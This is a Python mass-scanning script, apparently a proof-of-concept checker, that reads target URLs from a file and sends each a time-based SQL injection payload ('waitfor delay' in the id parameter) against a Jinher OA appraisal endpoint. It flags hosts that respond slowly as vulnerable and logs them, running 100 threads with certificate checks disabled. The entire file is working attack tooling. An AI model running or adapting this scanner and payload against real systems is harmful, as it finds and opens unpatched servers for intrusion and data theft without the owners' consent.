import requests
import threading
import time
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_vulnerability(url, results_file):
    try:
        target_url = urljoin(url.strip(), "/c6/Jhsoft.Web.Appraise/AppraiseStationSetUpdate.aspx/?id=1'waitfor delay'0:0:5'--&Name=1")

        start_time = time.time()
        response = requests.get(
            target_url,
            verify=False,
            allow_redirects=False,
            timeout=15
        )
        response_time = time.time() - start_time

        status_code = response.status_code
        if status_code >= 300 and status_code < 400:
            print(f"[INFO] URL: {url} - 状态码: {status_code} - 漏洞不存在")
            return False
            
        elif status_code == 200 and response_time > 5:
            vuln_info = f"[VULNERABLE] URL: {url} - 状态码: {status_code} - 响应时间: {response_time:.2f}秒 - 目标URL: {target_url}\n"
            print(vuln_info)

            with threading.Lock(): 
                with open(results_file, 'a', encoding='utf-8') as f:
                    f.write(vuln_info + "\n")
            return True
            
        else:
            print(f"[INFO] URL: {url} - 状态码: {status_code} - 响应时间: {response_time:.2f}秒 - 漏洞不存在")
            return False
            
    except requests.exceptions.Timeout:
        print(f"[TIMEOUT] URL: {url} - 请求超时")
        return False
        
    except requests.exceptions.ConnectionError:
        print(f"[ERROR] URL: {url} - 连接错误")
        return False
        
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] URL: {url} - 请求异常: {str(e)}")
        return False
        
    except Exception as e:
        print(f"[ERROR] URL: {url} - 未知异常: {str(e)}")
        return False

def main():
    url_file = "url.txt"
    result_file = "result.txt"

    open(result_file, 'w').close()

    try:
        with open(url_file, 'r', encoding='utf-8') as f:
            urls = f.readlines()
        
        if not urls:
            print("url.txt文件中没有找到URL")
            return
            
        print(f"共读取到 {len(urls)} 个URL，开始检测...")

        with ThreadPoolExecutor(max_workers=100) as executor:

            future_to_url = {
                executor.submit(check_vulnerability, url, result_file): url 
                for url in urls
            }
            completed = 0
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    future.result()
                except Exception as e:
                    print(f"[EXCEPTION] URL: {url} - 线程执行异常: {str(e)}")
                
                completed += 1
                if completed % 10 == 0:
                    print(f"已完成 {completed}/{len(urls)} 个URL检测")
        
        print(f"\n检测完成！结果已保存到 {result_file}")
        
    except FileNotFoundError:
        print(f"错误：找不到文件 {url_file}")
    except Exception as e:
        print(f"程序执行错误: {str(e)}")

if __name__ == "__main__":
    main()